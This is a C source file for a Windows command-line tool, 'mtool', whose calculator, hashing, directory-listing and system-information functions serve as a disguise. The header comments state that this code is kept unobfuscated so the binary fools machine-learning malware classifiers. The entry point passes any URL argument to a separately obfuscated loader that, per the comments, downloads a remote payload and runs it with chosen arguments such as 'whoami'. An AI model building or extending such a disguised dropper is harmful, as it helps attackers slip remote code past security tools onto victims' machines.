/*
 * mtool - Multi-purpose Command Line Utility
 *
 * This file contains ONLY legitimate utility code.
 * It is compiled WITHOUT obfuscation so the resulting machine code
 * looks like a normal application to ML classifiers.
 *
 * The loader lives in loader.cpp (compiled with OLLVM separately).
 *
 *   mtool calc <expr>           Expression calculator
 *   mtool hash <file>           SHA-256 file hash
 *   mtool info <file>           File details
 *   mtool ls [dir]              Directory listing
 *   mtool find <text> <file>    Text search in file
 *   mtool sysinfo               System information
 */

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <math.h>

#include "loader.h"

#pragma comment(lib, "kernel32.lib")


/* ===================================================================
 * SECTION 1 — SHA-256 SOFTWARE IMPLEMENTATION
 *
 * Pure math, no CryptoAPI, no imports.  ~200 lines of bitwise ops
 * that compile into clean, normal-looking machine code.
 * =================================================================== */

static const uint32_t SHA256_K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

typedef struct {
    uint32_t state[8];
    uint8_t  buf[64];
    uint64_t total;
} SHA256_CTX;

static uint32_t sha_rotr(uint32_t x, int n) {
    return (x >> n) | (x << (32 - n));
}

static void sha256_transform(SHA256_CTX* ctx, const uint8_t block[64]) {
    uint32_t W[64];
    uint32_t a, b, c, d, e, f, g, h;
    int i;

    for (i = 0; i < 16; i++) {
        W[i] = ((uint32_t)block[i * 4] << 24) |
               ((uint32_t)block[i * 4 + 1] << 16) |
               ((uint32_t)block[i * 4 + 2] << 8) |
               ((uint32_t)block[i * 4 + 3]);
    }
    for (i = 16; i < 64; i++) {
        uint32_t s0 = sha_rotr(W[i - 15], 7) ^ sha_rotr(W[i - 15], 18) ^ (W[i - 15] >> 3);
        uint32_t s1 = sha_rotr(W[i - 2], 17) ^ sha_rotr(W[i - 2], 19) ^ (W[i - 2] >> 10);
        W[i] = W[i - 16] + s0 + W[i - 7] + s1;
    }

    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];

    for (i = 0; i < 64; i++) {
        uint32_t S1  = sha_rotr(e, 6) ^ sha_rotr(e, 11) ^ sha_rotr(e, 25);
        uint32_t ch  = (e & f) ^ (~e & g);
        uint32_t t1  = h + S1 + ch + SHA256_K[i] + W[i];
        uint32_t S0  = sha_rotr(a, 2) ^ sha_rotr(a, 13) ^ sha_rotr(a, 22);
        uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
        uint32_t t2  = S0 + maj;

        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    ctx->state[0] += a; ctx->state[1] += b;
    ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f;
    ctx->state[6] += g; ctx->state[7] += h;
}

static void sha256_init(SHA256_CTX* ctx) {
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
    ctx->total = 0;
}

static void sha256_update(SHA256_CTX* ctx, const uint8_t* data, size_t len) {
    size_t offset = (size_t)(ctx->total & 63);
    ctx->total += len;
    for (size_t i = 0; i < len; i++) {
        ctx->buf[offset++] = data[i];
        if (offset == 64) {
            sha256_transform(ctx, ctx->buf);
            offset = 0;
        }
    }
}

static void sha256_final(SHA256_CTX* ctx, uint8_t digest[32]) {
    size_t offset = (size_t)(ctx->total & 63);
    ctx->buf[offset++] = 0x80;

    if (offset > 56) {
        memset(ctx->buf + offset, 0, 64 - offset);
        sha256_transform(ctx, ctx->buf);
        offset = 0;
    }
    memset(ctx->buf + offset, 0, 56 - offset);

    uint64_t bits = ctx->total * 8;
    for (int i = 7; i >= 0; i--)
        ctx->buf[56 + (7 - i)] = (uint8_t)(bits >> (i * 8));

    sha256_transform(ctx, ctx->buf);

    for (int i = 0; i < 8; i++) {
        digest[i * 4]     = (uint8_t)(ctx->state[i] >> 24);
        digest[i * 4 + 1] = (uint8_t)(ctx->state[i] >> 16);
        digest[i * 4 + 2] = (uint8_t)(ctx->state[i] >> 8);
        digest[i * 4 + 3] = (uint8_t)(ctx->state[i]);
    }
}


/* ===================================================================
 * SECTION 2 — EXPRESSION CALCULATOR (recursive descent parser)
 * =================================================================== */

static const char* calc_pos;
static int calc_err;

static double calc_expr(void);

static void calc_skip_ws(void) {
    while (*calc_pos == ' ' || *calc_pos == '\t') calc_pos++;
}

static double calc_number(void) {
    calc_skip_ws();

    /* Constants */
    if (strncmp(calc_pos, "pi", 2) == 0 &&
        !(calc_pos[2] >= 'a' && calc_pos[2] <= 'z')) {
        calc_pos += 2;
        return 3.14159265358979323846;
    }
    if (*calc_pos == 'e' &&
        !(calc_pos[1] >= 'a' && calc_pos[1] <= 'z')) {
        calc_pos++;
        return 2.71828182845904523536;
    }

    /* Functions */
    struct { const char* name; int len; } funcs[] = {
        {"sqrt",  4}, {"sin",   3}, {"cos",   3}, {"tan",  3},
        {"abs",   3}, {"log",   3}, {"ln",    2}, {"exp",  3},
        {"floor", 5}, {"ceil",  4}, {"round", 5}
    };

    for (int i = 0; i < 11; i++) {
        if (strncmp(calc_pos, funcs[i].name, funcs[i].len) == 0 &&
            calc_pos[funcs[i].len] == '(') {
            int fn = i;
            calc_pos += funcs[i].len + 1;
            double arg = calc_expr();
            calc_skip_ws();
            if (*calc_pos == ')') calc_pos++;
            switch (fn) {
                case 0:  return sqrt(arg);
                case 1:  return sin(arg);
                case 2:  return cos(arg);
                case 3:  return tan(arg);
                case 4:  return fabs(arg);
                case 5:  return log10(arg);
                case 6:  return log(arg);
                case 7:  return exp(arg);
                case 8:  return floor(arg);
                case 9:  return ceil(arg);
                case 10: return floor(arg + 0.5);
            }
        }
    }

    /* Parenthesised expression */
    if (*calc_pos == '(') {
        calc_pos++;
        double val = calc_expr();
        calc_skip_ws();
        if (*calc_pos == ')') calc_pos++;
        return val;
    }

    /* Unary minus */
    if (*calc_pos == '-') {
        calc_pos++;
        return -calc_number();
    }

    /* Numeric literal */
    char* end;
    double val = strtod(calc_pos, &end);
    if (end == calc_pos) {
        calc_err = 1;
        return 0;
    }
    calc_pos = end;
    return val;
}

static double calc_power(void) {
    double base = calc_number();
    calc_skip_ws();
    if (*calc_pos == '^') {
        calc_pos++;
        double exponent = calc_power();
        return pow(base, exponent);
    }
    return base;
}

static double calc_term(void) {
    double result = calc_power();
    calc_skip_ws();
    while (*calc_pos == '*' || *calc_pos == '/' || *calc_pos == '%') {
        char op = *calc_pos++;
        double right = calc_power();
        if (op == '*') result *= right;
        else if (op == '/') {
            if (right == 0) { calc_err = 1; return 0; }
            result /= right;
        } else {
            if (right == 0) { calc_err = 1; return 0; }
            result = fmod(result, right);
        }
        calc_skip_ws();
    }
    return result;
}

static double calc_expr(void) {
    double result = calc_term();
    calc_skip_ws();
    while (*calc_pos == '+' || *calc_pos == '-') {
        char op = *calc_pos++;
        double right = calc_term();
        if (op == '+') result += right;
        else           result -= right;
        calc_skip_ws();
    }
    return result;
}

static int RunCalc(const char* expression) {
    printf("\n  Expression: %s\n", expression);
    calc_pos = expression;
    calc_err = 0;
    double result = calc_expr();
    if (calc_err) {
        printf("  Error: invalid expression\n\n");
        return 1;
    }
    if (result == (int64_t)result && fabs(result) < 1e15)
        printf("  Result:     %lld\n\n", (int64_t)result);
    else
        printf("  Result:     %.10g\n\n", result);
    return 0;
}


/* ===================================================================
 * SECTION 3 — FILE UTILITIES (kernel32 only)
 * =================================================================== */

static const char* FormatSize(ULONGLONG bytes) {
    static char buf[64];
    if (bytes >= (1ULL << 30))
        sprintf(buf, "%.2f GB", (double)bytes / (1ULL << 30));
    else if (bytes >= (1ULL << 20))
        sprintf(buf, "%.2f MB", (double)bytes / (1ULL << 20));
    else if (bytes >= (1ULL << 10))
        sprintf(buf, "%.1f KB", (double)bytes / (1ULL << 10));
    else
        sprintf(buf, "%llu bytes", bytes);
    return buf;
}

static int RunHash(const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND)
            printf("\n  Error: file not found - %s\n\n", filePath);
        else if (err == ERROR_ACCESS_DENIED)
            printf("\n  Error: access denied - %s\n\n", filePath);
        else
            printf("\n  Error: cannot open file (code %u)\n\n", err);
        return 1;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);

    SHA256_CTX ctx;
    sha256_init(&ctx);

    uint8_t readBuf[8192];
    DWORD bytesRead;
    ULONGLONG totalRead = 0;
    ULONGLONG lastReport = 0;

    while (ReadFile(hFile, readBuf, sizeof(readBuf), &bytesRead, NULL) && bytesRead > 0) {
        sha256_update(&ctx, readBuf, bytesRead);
        totalRead += bytesRead;

        /* Progress for large files */
        if (fileSize.QuadPart > 10485760 && totalRead - lastReport > 5242880) {
            int pct = (int)((totalRead * 100) / fileSize.QuadPart);
            printf("  Hashing... %d%%\r", pct);
            lastReport = totalRead;
        }
    }

    uint8_t digest[32];
    sha256_final(&ctx, digest);
    CloseHandle(hFile);

    printf("\n  File:    %s\n", filePath);
    printf("  Size:    %s (%llu bytes)\n", FormatSize(fileSize.QuadPart), fileSize.QuadPart);
    printf("  SHA-256: ");
    for (int i = 0; i < 32; i++)
        printf("%02x", digest[i]);
    printf("\n\n");
    return 0;
}

static int RunFileInfo(const char* path) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &fad)) {
        printf("\n  Error: cannot access - %s (code %u)\n\n", path, GetLastError());
        return 1;
    }

    ULONGLONG size = ((ULONGLONG)fad.nFileSizeHigh << 32) | fad.nFileSizeLow;
    BOOL isDir = (fad.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

    SYSTEMTIME stc, stm, sta;
    FileTimeToSystemTime(&fad.ftCreationTime, &stc);
    FileTimeToSystemTime(&fad.ftLastWriteTime, &stm);
    FileTimeToSystemTime(&fad.ftLastAccessTime, &sta);

    printf("\n  Path:      %s\n", path);
    printf("  Type:      %s\n", isDir ? "Directory" : "File");
    if (!isDir)
        printf("  Size:      %s (%llu bytes)\n", FormatSize(size), size);
    printf("  Created:   %04d-%02d-%02d %02d:%02d:%02d\n",
           stc.wYear, stc.wMonth, stc.wDay, stc.wHour, stc.wMinute, stc.wSecond);
    printf("  Modified:  %04d-%02d-%02d %02d:%02d:%02d\n",
           stm.wYear, stm.wMonth, stm.wDay, stm.wHour, stm.wMinute, stm.wSecond);
    printf("  Accessed:  %04d-%02d-%02d %02d:%02d:%02d\n",
           sta.wYear, sta.wMonth, sta.wDay, sta.wHour, sta.wMinute, sta.wSecond);

    printf("  Attribs:  ");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_READONLY)   printf(" ReadOnly");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN)     printf(" Hidden");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM)     printf(" System");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)    printf(" Archive");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_COMPRESSED) printf(" Compressed");
    if (fad.dwFileAttributes & FILE_ATTRIBUTE_ENCRYPTED)  printf(" Encrypted");
    printf("\n\n");
    return 0;
}

static int RunLs(const char* dirPath) {
    char searchPath[MAX_PATH];
    if (dirPath && dirPath[0])
        sprintf(searchPath, "%s\\*", dirPath);
    else {
        GetCurrentDirectoryA(MAX_PATH, searchPath);
        strcat(searchPath, "\\*");
    }

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("\n  Error: cannot list directory (code %u)\n\n", GetLastError());
        return 1;
    }

    int fileCount = 0, dirCount = 0;
    ULONGLONG totalSize = 0;

    char dispDir[MAX_PATH];
    if (dirPath && dirPath[0])
        strncpy(dispDir, dirPath, MAX_PATH - 1);
    else
        GetCurrentDirectoryA(MAX_PATH, dispDir);

    printf("\n  Directory: %s\n\n", dispDir);
    printf("  %-12s  %-20s  %s\n", "Size", "Modified", "Name");
    printf("  %-12s  %-20s  %s\n", "----", "--------", "----");

    do {
        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char timeStr[32];
        sprintf(timeStr, "%04d-%02d-%02d %02d:%02d",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("  %-12s  %-20s  [%s]\n", "<DIR>", timeStr, fd.cFileName);
            dirCount++;
        } else {
            ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            totalSize += fsize;
            char sizeStr[32];
            if (fsize >= (1ULL << 20))
                sprintf(sizeStr, "%.1f MB", (double)fsize / (1ULL << 20));
            else if (fsize >= (1ULL << 10))
                sprintf(sizeStr, "%.0f KB", (double)fsize / (1ULL << 10));
            else
                sprintf(sizeStr, "%llu B", fsize);
            printf("  %-12s  %-20s  %s\n", sizeStr, timeStr, fd.cFileName);
            fileCount++;
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    printf("\n  %d file(s), %d dir(s), %s total\n\n",
           fileCount, dirCount, FormatSize(totalSize));
    return 0;
}

static int RunFind(const char* pattern, const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("\n  Error: cannot open - %s\n\n", filePath);
        return 1;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    if (fileSize.QuadPart > 50 * 1024 * 1024) {
        printf("\n  Error: file too large (max 50 MB for text search)\n\n");
        CloseHandle(hFile);
        return 1;
    }

    size_t allocSize = (size_t)fileSize.QuadPart + 1;
    char* content = (char*)malloc(allocSize);
    if (!content) {
        printf("\n  Error: not enough memory\n\n");
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    ReadFile(hFile, content, (DWORD)fileSize.QuadPart, &bytesRead, NULL);
    content[bytesRead] = '\0';
    CloseHandle(hFile);

    printf("\n  Searching '%s' in %s\n\n", pattern, filePath);

    int lineNum = 1;
    int matchCount = 0;
    const char* lineStart = content;
    size_t patLen = strlen(pattern);

    for (const char* p = content; *p; p++) {
        if (*p == '\n') {
            lineNum++;
            lineStart = p + 1;
            continue;
        }

        /* Case-insensitive substring match */
        BOOL match = TRUE;
        for (size_t k = 0; k < patLen && p[k]; k++) {
            char a = p[k], b = pattern[k];
            if (a >= 'A' && a <= 'Z') a += 32;
            if (b >= 'A' && b <= 'Z') b += 32;
            if (a != b) { match = FALSE; break; }
        }

        if (match) {
            const char* eol = p;
            while (*eol && *eol != '\n' && *eol != '\r') eol++;
            int lineLen = (int)(eol - lineStart);
            if (lineLen > 120) lineLen = 120;
            printf("  %5d: %.*s\n", lineNum, lineLen, lineStart);
            matchCount++;
            /* Skip rest of line */
            while (*p && *p != '\n') p++;
            if (*p == '\n') { lineNum++; lineStart = p + 1; }
        }
    }

    free(content);
    printf("\n  %d match(es) found\n\n", matchCount);
    return 0;
}


/* ===================================================================
 * SECTION 4 — SYSTEM INFORMATION (kernel32 only)
 * =================================================================== */

static int RunSysInfo(void) {
    printf("\n  System Information\n");
    printf("  ------------------\n\n");

    char compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD nameLen = sizeof(compName);
    if (GetComputerNameA(compName, &nameLen))
        printf("  Computer:    %s\n", compName);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    printf("  Platform:    x%s\n",
           si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "64" : "86");
    printf("  Processors:  %u\n", si.dwNumberOfProcessors);
    printf("  Page size:   %u bytes\n", si.dwPageSize);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms)) {
        printf("  RAM total:   %s\n", FormatSize(ms.ullTotalPhys));
        printf("  RAM free:    %s\n", FormatSize(ms.ullAvailPhys));
        printf("  RAM usage:   %u%%\n", ms.dwMemoryLoad);
    }

    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        printf("  Disk C:      %s total, %s free\n",
               FormatSize(totalBytes.QuadPart),
               FormatSize(freeBytes.QuadPart));
    }

    DWORD tickSec = (DWORD)(GetTickCount64() / 1000);
    DWORD days  = tickSec / 86400;
    DWORD hours = (tickSec % 86400) / 3600;
    DWORD mins  = (tickSec % 3600) / 60;
    printf("  Uptime:      %u day(s), %u hr, %u min\n", days, hours, mins);

    SYSTEMTIME lt;
    GetLocalTime(&lt);
    printf("  Local time:  %04d-%02d-%02d %02d:%02d:%02d\n",
           lt.wYear, lt.wMonth, lt.wDay, lt.wHour, lt.wMinute, lt.wSecond);

    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    printf("  Working dir: %s\n\n", cwd);

    return 0;
}


/* ===================================================================
 * SECTION 5 — HELP & VERSION
 * =================================================================== */

static void ShowHelp(const char* exe) {
    printf("\n");
    printf("  mtool 1.2.0 - Multi-purpose Command Line Utility\n");
    printf("  Copyright (c) 2025. All rights reserved.\n\n");
    printf("  Commands:\n");
    printf("    %s calc <expression>      Evaluate math expression\n", exe);
    printf("    %s hash <file>            Compute SHA-256 hash\n", exe);
    printf("    %s info <file>            Show file details\n", exe);
    printf("    %s ls [directory]         List directory contents\n", exe);
    printf("    %s find <text> <file>     Search text in file\n", exe);
    printf("    %s sysinfo                System information\n", exe);
    printf("    %s -v                     Version info\n\n", exe);
    printf("  Calculator examples:\n");
    printf("    %s calc \"2+3*4\"            = 14\n", exe);
    printf("    %s calc \"sqrt(144)\"        = 12\n", exe);
    printf("    %s calc \"sin(pi/2)\"        = 1\n", exe);
    printf("    %s calc \"2^10\"             = 1024\n\n", exe);
}


/* ===================================================================
 * SECTION 6 — ENTRY POINT
 *
 * Routes between utility mode (this file) and loader mode (loader.cpp).
 * The loader is linked from loader.obj via the RunLoaderMode() interface.
 * =================================================================== */

int main(int argc, char** argv) {

    if (argc < 2) {
        ShowHelp(argv[0]);
        return 0;
    }

    if (strcmp(argv[1], "-v") == 0 || strcmp(argv[1], "--version") == 0) {
        ShowHelp(argv[0]);
        return 0;
    }

    /* Calculator */
    if (strcmp(argv[1], "calc") == 0) {
        if (argc < 3) { printf("\n  Usage: %s calc <expression>\n\n", argv[0]); return 1; }
        char expr[1024] = { 0 };
        for (int i = 2; i < argc; i++) {
            if (i > 2) strcat(expr, " ");
            strncat(expr, argv[i], sizeof(expr) - strlen(expr) - 2);
        }
        return RunCalc(expr);
    }

    /* Hash */
    if (strcmp(argv[1], "hash") == 0) {
        if (argc < 3) { printf("\n  Usage: %s hash <file>\n\n", argv[0]); return 1; }
        return RunHash(argv[2]);
    }

    /* File info */
    if (strcmp(argv[1], "info") == 0) {
        if (argc < 3) { printf("\n  Usage: %s info <file>\n\n", argv[0]); return 1; }
        return RunFileInfo(argv[2]);
    }

    /* Directory listing */
    if (strcmp(argv[1], "ls") == 0 || strcmp(argv[1], "dir") == 0) {
        return RunLs(argc >= 3 ? argv[2] : NULL);
    }

    /* Text search */
    if (strcmp(argv[1], "find") == 0 || strcmp(argv[1], "grep") == 0) {
        if (argc < 4) { printf("\n  Usage: %s find <text> <file>\n\n", argv[0]); return 1; }
        return RunFind(argv[2], argv[3]);
    }

    /* System info */
    if (strcmp(argv[1], "sysinfo") == 0) {
        return RunSysInfo();
    }

    /* HTTP URL -> loader mode (defined in loader.cpp) */
    /* Extra args after the URL are passed as the payload's command line */
    /* Example: mtool http://host/payload.bin -c "whoami"               */
    /*          -> payload sees: program.exe -c whoami                  */
    if (strncmp(argv[1], "http://", 7) == 0 || strncmp(argv[1], "https://", 8) == 0) {
        if (argc < 3) {
            printf("  Usage: %s <url> <passphrase> [args...]\n", argv[0]);
            return 1;
        }
        char payloadArgs[4096] = { 0 };
        for (int i = 3; i < argc; i++) {
            if (i > 3) strcat(payloadArgs, " ");
            strncat(payloadArgs, argv[i], sizeof(payloadArgs) - strlen(payloadArgs) - 2);
        }
        return RunLoaderMode(argv[1], argv[2], payloadArgs[0] ? payloadArgs : NULL);
    }

    /* Default: single arg = auto-detect file/dir/expression */
    if (argc == 2) {
        DWORD attr = GetFileAttributesA(argv[1]);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            if (attr & FILE_ATTRIBUTE_DIRECTORY)
                return RunLs(argv[1]);
            else
                return RunHash(argv[1]);
        }
        return RunCalc(argv[1]);
    }

    ShowHelp(argv[0]);
    return 0;
}
